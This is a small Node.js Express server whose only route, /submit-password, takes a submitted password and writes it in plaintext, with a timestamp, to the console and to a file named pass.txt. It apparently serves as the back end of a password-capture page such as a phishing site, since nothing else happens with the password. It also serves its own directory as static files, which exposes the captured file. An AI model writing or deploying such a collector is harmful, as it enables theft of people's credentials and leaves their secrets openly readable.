const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 8000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "./"))); // Serve static files from current directory

// Route to handle password submission
app.post("/submit-password", (req, res) => {
  const { password } = req.body;
  const timestamp = new Date().toISOString();
  const data = `Password: ${password} | Timestamp: ${timestamp}`;
  console.log(data);

  fs.appendFile("pass.txt", data, (err) => {
    if (err) {
      console.error("Error saving password:", err);
      return res
        .status(500)
        .json({ success: false, message: "Failed to save password" });
    }

    console.log("Password saved successfully\n");
    res.json({ success: true, message: "Password received" });
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
